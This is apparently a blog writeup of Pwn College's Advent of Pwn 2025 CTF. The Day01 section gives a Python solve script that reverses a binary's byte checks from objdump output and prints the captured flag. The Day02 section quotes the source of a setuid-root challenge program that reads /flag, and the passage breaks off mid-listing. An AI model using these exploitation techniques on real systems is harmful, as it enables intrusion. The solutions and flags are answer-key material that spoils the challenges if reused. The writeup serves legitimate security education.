<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="[Writeup] Advent of Pwn 2025(Pwn College)" /><meta property="og:locale" content="en" /><meta name="description" content="Writeup for Advent of Pwn 2025" /><meta property="og:description" content="Writeup for Advent of Pwn 2025" /><link rel="canonical" href="https://blog.kaytii.me/posts/pwncollege-advent-writeup/" /><meta property="og:url" content="https://blog.kaytii.me/posts/pwncollege-advent-writeup/" /><meta property="og:site_name" content="KayTii" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-12-20T07:00:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="[Writeup] Advent of Pwn 2025(Pwn College)" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-12-20T07:00:00+07:00","datePublished":"2025-12-20T07:00:00+07:00","description":"Writeup for Advent of Pwn 2025","headline":"[Writeup] Advent of Pwn 2025(Pwn College)","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.kaytii.me/posts/pwncollege-advent-writeup/"},"url":"https://blog.kaytii.me/posts/pwncollege-advent-writeup/"}</script><title>[Writeup] Advent of Pwn 2025(Pwn College) | KayTii</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/avt/avt.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">KayTii</a><p class="site-subtitle fst-italic mb-0">Pwnable</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/Kaytii210" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dkhoitran2106','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/tran-le-dang-khoi-2a54a1391/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="https://www.facebook.com/kaytii.2210" aria-label="facebook" target="_blank" rel="noopener noreferrer" > <i class="fab fa-facebook"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>[Writeup] Advent of Pwn 2025(Pwn College)</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>[Writeup] Advent of Pwn 2025(Pwn College)</h1><p class="post-desc fw-light mb-4">Writeup for Advent of Pwn 2025</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1766188800" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Dec 20, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/Kaytii210">Khoi Tran</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="27609 words" > <em>153 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">[Writeup] Advent of Pwn 2025(Pwn College)</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">[Writeup] Advent of Pwn 2025(Pwn College)</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="preface"><span class="me-2">Preface</span><a href="#preface" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is my writeup for <a href="https://pwn.college/advent-of-pwn/2025/">Advent of Pwn 2025</a>, a CTF-style challenge series hosted by <a href="https://pwn.college/">Pwn College</a>. The challenges are designed to teach and test skills in binary exploitation, reverse engineering, and related areas.</p><hr /><h2 id="day01"><span class="me-2">Day01</span><a href="#day01" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description"><span class="me-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Every year, Santa maintains the legendary Naughty-or-Nice list, and despite the rumors, there‚Äôs no magic</p><p>behind it at all‚Äîit‚Äôs pure, meticulous byte-level bookkeeping. Your job is to apply every tiny change exactly and</p><p>confirm the final list matches perfectly‚Äîcheck it once, check it twice, because Santa does not tolerate even a</p><p>single incorrect byte. At the North Pole, it‚Äôs all just static analysis anyway: even a simple <code class="language-plaintext highlighter-rouge">objdump | grep naughty</code></p><p>goes a long way.</p><hr /><h3 id="analysis"><span class="me-2">Analysis</span><a href="#analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When I first opened IDA, a huge christmas tree greeted me with millions of instructions and a message <code class="language-plaintext highlighter-rouge">Decompilation failure</code>.</p><p>A big surprise from pwn.college üòÖ.</p><p><a href="/assets/img/AdventOfPwn2025/pic1.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic1.png" alt="Desktop View" width="150" height="150" loading="lazy"></a> <a href="/assets/img/AdventOfPwn2025/pic2.png" class="popup img-link right shimmer"><img src="/assets/img/AdventOfPwn2025/pic2.png" alt="Desktop View" width="400" height="150" loading="lazy"></a></p><p>The program read <code class="language-plaintext highlighter-rouge">0x400</code> bytes from user iput and after a millions of <code class="language-plaintext highlighter-rouge">add</code> and <code class="language-plaintext highlighter-rouge">sub</code> instructions, it compared</p><p>each byte against hardcoded constants with <code class="language-plaintext highlighter-rouge">cmp</code>.</p><ul><li><p>If any byte doesn‚Äôt match, it prints: <code class="language-plaintext highlighter-rouge">üö´ Wrong: Santa told you to check that list twice!</code>.</p><li><p>If all comparisons succeed, it prints: <code class="language-plaintext highlighter-rouge">‚ú® Correct: you checked it twice, and it shows!</code> and return the flag.</p></ul><hr /><h3 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Because there are too many instructions, I decided to use <code class="language-plaintext highlighter-rouge">objdump</code> and write script to compute</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>objdump <span class="nt">-d</span> <span class="nt">-M</span> intel check-list <span class="o">&gt;</span> disasm.txt
</pre></table></code></div></div><p>(<code class="language-plaintext highlighter-rouge">-d</code> for disassemble executable sections, <code class="language-plaintext highlighter-rouge">-M intel</code> forces Intel syntax, which is easier to parse with regex.)</p><p>So, I will write a function that</p><ul><li>For every instruction of the form</ul><pre class="nolineno"><code class="language-asm">add BYTE PTR [rbp-0xOFF], 0xIMM
sub BYTE PTR [rbp-0xOFF], 0xIMM
</code></pre><p>I compute the corresponding input index with: <code class="language-plaintext highlighter-rouge">index = 0x400 - OFF</code> and accumulate the net effect into a</p><p>delta[index] table and the same for <code class="language-plaintext highlighter-rouge">cmp</code>.</p><p>The program enforces: <code class="language-plaintext highlighter-rouge">(input[i] + delta[i]) &amp; 0xff = target[i]</code></p><p>So the input byte at index <code class="language-plaintext highlighter-rouge">i</code> is: <code class="language-plaintext highlighter-rouge">input[i] = (target[i] - delta[i]) &amp; 0xff</code></p><p>Solve script:</p><details> <summary>Click to view <code>solve.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">re</span><span class="p">,</span> <span class="n">sys</span>

<span class="n">BUF</span> <span class="o">=</span> <span class="mh">0x400</span>


<span class="k">def</span> <span class="nf">parse_disasm</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">ra</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span>
        <span class="sa">r</span><span class="sh">'</span><span class="s">\s*[0-9a-fA-F]+:.*\b(add|sub)\s+BYTE PTR \[rbp-0x([0-9a-fA-F]+)\],0x([0-9a-fA-F]+)</span><span class="sh">'</span>
    <span class="p">)</span>
    <span class="n">rc</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span>
        <span class="sa">r</span><span class="sh">'</span><span class="s">\s*[0-9a-fA-F]+:.*\bcmp\s+BYTE PTR \[rbp-0x([0-9a-fA-F]+)\],0x([0-9a-fA-F]+)</span><span class="sh">'</span>
    <span class="p">)</span>
    <span class="n">deltas</span><span class="p">,</span> <span class="n">cmps</span> <span class="o">=</span> <span class="p">{},</span> <span class="p">{}</span>

    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">):</span>
        <span class="n">m</span> <span class="o">=</span> <span class="n">ra</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
            <span class="n">op</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="n">off</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
            <span class="n">imm</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
            <span class="n">idx</span> <span class="o">=</span> <span class="n">BUF</span> <span class="o">-</span> <span class="n">off</span>
            <span class="k">if</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="n">d</span> <span class="o">=</span> <span class="n">deltas</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">deltas</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span> <span class="o">+</span> <span class="n">imm</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span> <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="sh">"</span><span class="s">add</span><span class="sh">"</span> <span class="nf">else </span><span class="p">(</span><span class="n">d</span> <span class="o">-</span> <span class="n">imm</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>

        <span class="n">m</span> <span class="o">=</span> <span class="n">rc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
            <span class="n">off</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
            <span class="n">val</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
            <span class="n">idx</span> <span class="o">=</span> <span class="n">BUF</span> <span class="o">-</span> <span class="n">off</span>
            <span class="k">if</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="n">cmps</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>

    <span class="k">return</span> <span class="n">deltas</span><span class="p">,</span> <span class="n">cmps</span>


<span class="n">deltas</span><span class="p">,</span> <span class="n">cmps</span> <span class="o">=</span> <span class="nf">parse_disasm</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>

<span class="n">mn</span><span class="p">,</span> <span class="n">mx</span> <span class="o">=</span> <span class="nf">min</span><span class="p">(</span><span class="n">cmps</span><span class="p">),</span> <span class="nf">max</span><span class="p">(</span><span class="n">cmps</span><span class="p">)</span>
<span class="n">desired</span><span class="p">,</span> <span class="n">orig</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(),</span> <span class="nf">bytearray</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">mn</span><span class="p">,</span> <span class="n">mx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
    <span class="n">v</span> <span class="o">=</span> <span class="n">cmps</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">desired</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">deltas</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">orig</span><span class="p">.</span><span class="nf">append</span><span class="p">((</span><span class="n">v</span> <span class="o">-</span> <span class="n">d</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">desired_str:</span><span class="sh">"</span><span class="p">,</span> <span class="n">desired</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">latin1</span><span class="sh">"</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">replace</span><span class="sh">"</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">desired_hex:</span><span class="sh">"</span><span class="p">,</span> <span class="n">desired</span><span class="p">.</span><span class="nf">hex</span><span class="p">())</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">input_hex:</span><span class="sh">"</span><span class="p">,</span> <span class="n">orig</span><span class="p">.</span><span class="nf">hex</span><span class="p">())</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">input_ascii:</span><span class="sh">"</span><span class="p">,</span> <span class="n">orig</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">latin1</span><span class="sh">"</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="sh">"</span><span class="s">replace</span><span class="sh">"</span><span class="p">))</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/check-list</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">orig</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></table></code></div></div></details><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{wIbQ8j1cIjonK0sCN1R-iNSmjNj.0FO1gTMywiN1UDN0EzW}</code></p><hr /><h2 id="day02"><span class="me-2">Day02</span><a href="#day02" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="description-1"><span class="me-2">Description</span><a href="#description-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>CLAUS(7)                   Linux Programmer's Manual                   CLAUS(7)

NAME
       claus - unstoppable holiday daemon

DESCRIPTION
       Executes once per annum.
       Blocks SIGTSTP to ensure uninterrupted delivery.
       May dump coal if forced to quit (see BUGS).

BUGS       
       Under some configurations, quitting may result in coal being dumped into
       your stocking.

SEE ALSO
       nice(1), core(5), elf(5), pty(7), signal(7)

Linux                              Dec 2025                            CLAUS(7)
</pre></table></code></div></div><p>You really should <a href="https://pwn.college/welcome/welcome/">start here</a> if you‚Äôre new to the dojo or could use a refresher.</p><hr /><h3 id="analysis-1"><span class="me-2">Analysis</span><a href="#analysis-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>claus.c</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
</pre><td class="rouge-code"><pre><span class="cp">#define _GNU_SOURCE
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">gift</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">wrap</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">gift</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"Wrapping gift: [          ] 0%%"</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">gift</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"#####</span><span class="se">\n</span><span class="s">"</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">6</span><span class="p">];</span>
        <span class="kt">int</span> <span class="n">progress</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span> <span class="o">/</span> <span class="n">size</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">bars</span> <span class="o">=</span> <span class="n">progress</span> <span class="o">/</span> <span class="mi">10</span><span class="p">;</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\r</span><span class="s">Wrapping gift: ["</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">fputc</span><span class="p">(</span><span class="n">j</span> <span class="o">&lt;</span> <span class="n">bars</span> <span class="o">?</span> <span class="sc">'='</span> <span class="o">:</span> <span class="sc">' '</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"] %d%%"</span><span class="p">,</span> <span class="n">progress</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">üéÅ Gift wrapped successfully!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">sigtstp_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">signum</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"üéÖ Santa won't stop!"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">uid_t</span> <span class="n">ruid</span><span class="p">,</span> <span class="n">euid</span><span class="p">,</span> <span class="n">suid</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">getresuid</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ruid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">euid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">suid</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"getresuid"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">euid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"‚ùå Error: Santa must wrap as root!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ruid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">setreuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"setreuid"</span><span class="p">);</span>
            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"ü¶å Now, Dasher! now, Dancer! now, Prancer and Vixen!</span><span class="se">\n</span><span class="s">On, Comet! on Cupid! on, Donder and Blitzen!</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">execve</span><span class="p">(</span><span class="s">"/proc/self/exe"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>

        <span class="n">perror</span><span class="p">(</span><span class="s">"execve"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">127</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">signal</span><span class="p">(</span><span class="n">SIGTSTP</span><span class="p">,</span> <span class="n">sigtstp_handler</span><span class="p">)</span> <span class="o">==</span> <span class="n">SIG_ERR</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"signal"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"open"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

